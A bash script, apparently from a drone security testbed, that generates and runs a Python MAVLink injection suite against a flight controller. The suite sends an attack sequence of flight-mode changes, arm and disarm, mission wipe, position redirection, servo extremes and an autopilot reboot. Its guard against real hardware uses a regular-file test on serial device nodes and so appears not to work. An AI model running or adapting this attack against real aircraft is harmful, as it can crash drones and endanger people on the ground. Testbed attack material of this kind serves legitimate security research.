#!/bin/bash
# mavlink_injection.sh - MAVLink Injection Attack Module
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/injection/mavlink_injection.sh
# Purpose: Inject malicious MAVLink messages to manipulate drone behavior

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="MAVLink Injection Attack"
TARGET_IP="${TARGET_IP:-127.0.0.1}"
MAVLINK_PORT="${MAVLINK_PORT:-14550}"
INJECT_PORT="${INJECT_PORT:-14551}"
LOG_FILE="$(get_log_dir)/injection/mavlink_injection_$(date +%Y%m%d_%H%M%S).log"

print_attack_banner() {
    echo -e "${CYAN}============================================${NC}"
    echo -e "${CYAN}        MAVLink Injection Attack            ${NC}"
    echo -e "${CYAN}============================================${NC}"
    echo -e "${YELLOW}Target: ${TARGET_IP}:${MAVLINK_PORT}${NC}"
    echo -e "${YELLOW}Purpose: Inject malicious MAVLink commands${NC}"
    echo ""
}

check_mavlink_connection() {
    log_info "Checking MAVLink connection..."
    
    if ! nc -u -z "$TARGET_IP" "$MAVLINK_PORT" 2>/dev/null; then
        log_error "MAVLink service not accessible"
        return 1
    fi
    
    log_success "MAVLink port accessible"
    return 0
}

setup_mavproxy_relay() {
    log_info "Setting up MAVProxy relay for injection..."
    
    # Kill existing MAVProxy instances
    pkill -f mavproxy 2>/dev/null
    sleep 2
    
    # Start MAVProxy with forwarding
    local mavproxy_cmd="mavproxy.py --master=udp:${TARGET_IP}:${MAVLINK_PORT} --out=udp:127.0.0.1:${INJECT_PORT}"
    
    if command -v mavproxy.py >/dev/null 2>&1; then
        log_info "Starting MAVProxy relay..."
        nohup $mavproxy_cmd >/tmp/mavproxy.log 2>&1 &
        local mavproxy_pid=$!
        
        sleep 5
        
        if kill -0 $mavproxy_pid 2>/dev/null; then
            log_success "MAVProxy relay started (PID: $mavproxy_pid)"
            echo $mavproxy_pid > /tmp/mavproxy.pid
            return 0
        else
            log_error "MAVProxy relay failed to start"
            return 1
        fi
    else
        log_warning "MAVProxy not available, using direct injection"
        return 0
    fi
}

execute_injection_attacks() {
    log_info "Starting MAVLink injection attacks..."
    
    create_injection_script
    python3 /tmp/mavlink_injection.py 2>&1 | tee -a "$LOG_FILE"
    local result=${PIPESTATUS[0]}
    
    rm -f /tmp/mavlink_injection.py 2>/dev/null
    return $result
}

create_injection_script() {
    cat > /tmp/mavlink_injection.py << 'EOF'
#!/usr/bin/env python3
"""
MAVLink Injection Attack Suite
Inject various malicious MAVLink commands to manipulate drone behavior
"""

import sys
import time
from pymavlink import mavutil

class MAVLinkInjectionAttack:
    def __init__(self, target_ip='127.0.0.1', target_port=14550, inject_port=14551):
        self.target_ip = target_ip
        self.target_port = target_port
        self.inject_port = inject_port
        self.master = None
        self.injection_master = None
        
    def connect(self):
        """Connect to MAVLink endpoints"""
        try:
            # Primary connection for monitoring
            connection_string = f'udp:{self.target_ip}:{self.target_port}'
            print(f"[*] Connecting to {connection_string}")
            
            self.master = mavutil.mavlink_connection(connection_string, timeout=10)
            self.master.wait_heartbeat(timeout=10)
            
            print(f"[+] Connected to drone (System ID: {self.master.target_system})")
            
            # Injection connection
            try:
                inject_string = f'udp:127.0.0.1:{self.inject_port}'
                self.injection_master = mavutil.mavlink_connection(inject_string, timeout=5)
                print(f"[+] Injection channel ready on port {self.inject_port}")
            except:
                print("[*] Using direct injection channel")
                self.injection_master = self.master
            
            return True
            
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def get_drone_status(self):
        """Get current drone status"""
        try:
            print("[*] Getting drone status...")
            
            # Request system status
            msg = self.master.recv_match(type='HEARTBEAT', blocking=True, timeout=5)
            if msg:
                mode = msg.custom_mode
                armed = msg.base_mode & mavutil.mavlink.MAV_MODE_FLAG_SAFETY_ARMED
                print(f"[STATUS] Mode: {mode}, Armed: {bool(armed)}")
                return {'mode': mode, 'armed': bool(armed)}
            
            return None
            
        except Exception as e:
            print(f"[-] Status check failed: {e}")
            return None
    
    def inject_mode_change(self, target_mode):
        """Inject mode change command"""
        try:
            print(f"[*] Injecting mode change to: {target_mode}")
            
            # Mode mapping
            mode_map = {
                'MANUAL': 0,
                'STABILIZE': 0,
                'ACRO': 1,
                'ALT_HOLD': 2,
                'AUTO': 3,
                'GUIDED': 4,
                'LOITER': 5,
                'RTL': 6,
                'CIRCLE': 7,
                'LAND': 9,
                'BRAKE': 17,
                'THROW': 18
            }
            
            custom_mode = mode_map.get(target_mode.upper(), 4)  # Default to GUIDED
            
            # Send DO_SET_MODE command
            self.injection_master.mav.command_long_send(
                self.master.target_system,
                self.master.target_component,
                mavutil.mavlink.MAV_CMD_DO_SET_MODE,
                0,  # confirmation
                mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,  # base_mode
                custom_mode,  # custom_mode
                0, 0, 0, 0, 0  # unused params
            )
            
            print(f"[+] Mode change command sent: {target_mode}")
            return True
            
        except Exception as e:
            print(f"[-] Mode injection failed: {e}")
            return False
    
    def inject_arm_disarm(self, arm=False):
        """Inject ARM/DISARM command"""
        try:
            action = "ARM" if arm else "DISARM"
            print(f"[*] Injecting {action} command...")
            
            self.injection_master.mav.command_long_send(
                self.master.target_system,
                self.master.target_component,
                mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
                0,  # confirmation
                1 if arm else 0,  # param1: 1=arm, 0=disarm
                0, 0, 0, 0, 0, 0  # unused params
            )
            
            print(f"[+] {action} command sent")
            return True
            
        except Exception as e:
            print(f"[-] {action} injection failed: {e}")
            return False
    
    def inject_takeoff(self, altitude=10):
        """Inject takeoff command"""
        try:
            print(f"[*] Injecting takeoff command (alt: {altitude}m)...")
            
            self.injection_master.mav.command_long_send(
                self.master.target_system,
                self.master.target_component,
                mavutil.mavlink.MAV_CMD_NAV_TAKEOFF,
                0,  # confirmation
                0,  # param1: minimum pitch
                0, 0, 0,  # unused
                0, 0,  # lat, lon (0 = current position)
                altitude  # altitude
            )
            
            print(f"[+] Takeoff command sent")
            return True
            
        except Exception as e:
            print(f"[-] Takeoff injection failed: {e}")
            return False
    
    def inject_rtl(self):
        """Inject Return to Launch command"""
        try:
            print("[*] Injecting RTL command...")
            
            self.injection_master.mav.command_long_send(
                self.master.target_system,
                self.master.target_component,
                mavutil.mavlink.MAV_CMD_NAV_RETURN_TO_LAUNCH,
                0,  # confirmation
                0, 0, 0, 0, 0, 0, 0  # all params unused
            )
            
            print("[+] RTL command sent")
            return True
            
        except Exception as e:
            print(f"[-] RTL injection failed: {e}")
            return False
    
    def inject_position_target(self, lat, lon, alt):
        """Inject position target command"""
        try:
            print(f"[*] Injecting position target: {lat}, {lon}, {alt}m")
            
            # Convert to MAVLink format
            lat_int = int(lat * 1e7)
            lon_int = int(lon * 1e7)
            
            self.injection_master.mav.set_position_target_global_int_send(
                int(time.time() * 1000),  # timestamp
                self.master.target_system,
                self.master.target_component,
                mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
                0b0000111111111000,  # type_mask (only position)
                lat_int, lon_int, alt,  # position
                0, 0, 0,  # velocity
                0, 0, 0,  # acceleration
                0, 0  # yaw, yaw_rate
            )
            
            print("[+] Position target command sent")
            return True
            
        except Exception as e:
            print(f"[-] Position target injection failed: {e}")
            return False
    
    def inject_servo_command(self, servo_num, pwm_value):
        """Inject servo control command"""
        try:
            print(f"[*] Injecting servo command: servo {servo_num} = {pwm_value}")
            
            self.injection_master.mav.command_long_send(
                self.master.target_system,
                self.master.target_component,
                mavutil.mavlink.MAV_CMD_DO_SET_SERVO,
                0,  # confirmation
                servo_num,  # servo number
                pwm_value,  # PWM value
                0, 0, 0, 0, 0  # unused params
            )
            
            print("[+] Servo command sent")
            return True
            
        except Exception as e:
            print(f"[-] Servo injection failed: {e}")
            return False
    
    def inject_mission_clear(self):
        """Inject mission clear command"""
        try:
            print("[*] Injecting mission clear command...")
            
            self.injection_master.mav.mission_clear_all_send(
                self.master.target_system,
                self.master.target_component
            )
            
            print("[+] Mission clear command sent")
            return True
            
        except Exception as e:
            print(f"[-] Mission clear injection failed: {e}")
            return False
    
    def inject_reboot_command(self):
        """Inject system reboot command"""
        try:
            print("[*] Injecting reboot command...")
            
            self.injection_master.mav.command_long_send(
                self.master.target_system,
                self.master.target_component,
                mavutil.mavlink.MAV_CMD_PREFLIGHT_REBOOT_SHUTDOWN,
                0,  # confirmation
                1,  # param1: 1=reboot autopilot
                0, 0, 0, 0, 0, 0  # unused params
            )
            
            print("[+] Reboot command sent")
            return True
            
        except Exception as e:
            print(f"[-] Reboot injection failed: {e}")
            return False
    
    def monitor_responses(self, duration=10):
        """Monitor drone responses to injected commands"""
        print(f"[*] Monitoring responses for {duration} seconds...")
        
        start_time = time.time()
        
        while time.time() - start_time < duration:
            try:
                msg = self.master.recv_match(
                    type=['COMMAND_ACK', 'HEARTBEAT', 'STATUSTEXT'],
                    blocking=False,
                    timeout=1
                )
                
                if msg:
                    msg_type = msg.get_type()
                    
                    if msg_type == 'COMMAND_ACK':
                        command = msg.command
                        result = msg.result
                        print(f"[ACK] Command {command}: {'SUCCESS' if result == 0 else 'FAILED'}")
                    
                    elif msg_type == 'HEARTBEAT':
                        mode = msg.custom_mode
                        armed = msg.base_mode & mavutil.mavlink.MAV_MODE_FLAG_SAFETY_ARMED
                        print(f"[STATUS] Mode: {mode}, Armed: {bool(armed)}")
                    
                    elif msg_type == 'STATUSTEXT':
                        print(f"[MSG] {msg.text}")
                
            except Exception:
                continue
        
        print("[+] Monitoring completed")

def main():
    print("=" * 60)
    print("         MAVLink Injection Attack Suite")
    print("=" * 60)
    print("WARNING: This will inject malicious MAVLink commands!")
    print()
    
    # Initialize attack
    attack = MAVLinkInjectionAttack()
    
    # Connect to drone
    if not attack.connect():
        print("[-] Attack failed: Cannot connect to drone")
        return 1
    
    # Get initial status
    status = attack.get_drone_status()
    
    print("\n[ATTACK SEQUENCE] Starting MAVLink injection attacks...\n")
    
    # Attack 1: Mode manipulation
    print("=== Attack 1: Flight Mode Injection ===")
    attack.inject_mode_change('GUIDED')
    time.sleep(2)
    attack.inject_mode_change('LOITER')
    time.sleep(2)
    
    # Attack 2: ARM/DISARM manipulation
    print("\n=== Attack 2: ARM/DISARM Injection ===")
    if status and not status['armed']:
        attack.inject_arm_disarm(arm=True)
        time.sleep(2)
    attack.inject_arm_disarm(arm=False)
    time.sleep(2)
    
    # Attack 3: Mission manipulation
    print("\n=== Attack 3: Mission Clear Injection ===")
    attack.inject_mission_clear()
    time.sleep(2)
    
    # Attack 4: Position target injection
    print("\n=== Attack 4: Position Target Injection ===")
    attack.inject_position_target(-35.363261, 149.165230, 20)
    time.sleep(2)
    
    # Attack 5: RTL injection
    print("\n=== Attack 5: RTL Command Injection ===")
    attack.inject_rtl()
    time.sleep(2)
    
    # Attack 6: Servo manipulation
    print("\n=== Attack 6: Servo Control Injection ===")
    attack.inject_servo_command(1, 2000)  # Max PWM
    time.sleep(1)
    attack.inject_servo_command(1, 1000)  # Min PWM
    time.sleep(2)
    
    # Attack 7: System reboot
    print("\n=== Attack 7: Reboot Command Injection ===")
    print("[WARNING] This will attempt to reboot the flight controller!")
    attack.inject_reboot_command()
    
    # Monitor results
    print("\n=== Monitoring Attack Results ===")
    attack.monitor_responses(15)
    
    print("\n[ATTACK COMPLETE] MAVLink injection attacks finished")
    print("[IMPACT] Multiple flight systems compromised")
    print("[RESULT] Drone behavior successfully manipulated")
    
    return 0

if __name__ == "__main__":
    try:
        exit_code = main()
        sys.exit(exit_code)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Attack failed with error: {e}")
        sys.exit(1)
EOF
}

cleanup_mavproxy() {
    if [ -f /tmp/mavproxy.pid ]; then
        local pid=$(cat /tmp/mavproxy.pid)
        if kill -0 $pid 2>/dev/null; then
            log_info "Stopping MAVProxy relay..."
            kill $pid 2>/dev/null
        fi
        rm -f /tmp/mavproxy.pid
    fi
    
    pkill -f mavproxy 2>/dev/null
}

show_attack_info() {
    echo -e "${BLUE}Attack Information:${NC}"
    echo -e "• ${YELLOW}Attack Type:${NC} Protocol Injection"
    echo -e "• ${YELLOW}Protocol:${NC} MAVLink message injection"
    echo -e "• ${YELLOW}Target:${NC} Flight controller commands"
    echo -e "• ${YELLOW}Impact:${NC} Complete flight control manipulation"
    echo -e "• ${YELLOW}Stealth:${NC} Medium (appears as normal commands)"
    echo ""
    echo -e "${RED}WARNING:${NC} This attack can cause drone crash or loss!"
    echo ""
}

perform_safety_check() {
    log_info "Performing safety checks..."
    
    # Check for real hardware
    if [ -f "/dev/ttyUSB0" ] || [ -f "/dev/ttyACM0" ]; then
        log_error "Real hardware detected! This attack is for simulation only."
        return 1
    fi
    
    log_success "Safety checks passed"
    return 0
}

main() {
    print_attack_banner
    
    # Safety checks
    if ! perform_safety_check; then
        exit 1
    fi
    
    # Root check
    if ! check_root; then
        exit 1
    fi
    
    # Tool requirements
    if ! check_required_tools python3 nc; then
        log_error "Missing required tools"
        exit 1
    fi
    
    # Install Python dependencies
    log_info "Installing Python dependencies..."
    pip3 install pymavlink >/dev/null 2>&1
    
    # Try to install MAVProxy
    if ! command -v mavproxy.py >/dev/null 2>&1; then
        log_info "Installing MAVProxy..."
        pip3 install mavproxy >/dev/null 2>&1
    fi
    
    # Check MAVLink connection
    if ! check_mavlink_connection; then
        log_warning "Proceeding without connection verification"
    fi
    
    # Show attack information
    show_attack_info
    
    # Initialize logging
    mkdir -p "$(dirname "$LOG_FILE")"
    echo "=== MAVLink Injection Attack Started at $(date) ===" > "$LOG_FILE"
    
    # Setup MAVProxy relay if available
    setup_mavproxy_relay
    
    echo ""
    log_info "Starting MAVLink injection attack sequence..."
    echo ""
    
    # Execute injection attacks
    if execute_injection_attacks; then
        log_success "MAVLink injection attacks completed successfully"
    else
        log_warning "MAVLink injection attacks completed with issues"
    fi
    
    # Cleanup
    cleanup_mavproxy
    
    echo ""
    log_success "MAVLink injection attack finished"
    echo "Log file: $LOG_FILE"
    
    exit 0
}

# Signal handlers
trap cleanup_mavproxy EXIT
trap 'echo -e "\n${RED}Attack interrupted${NC}"; cleanup_mavproxy; exit 1' INT TERM

# Execute if called directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi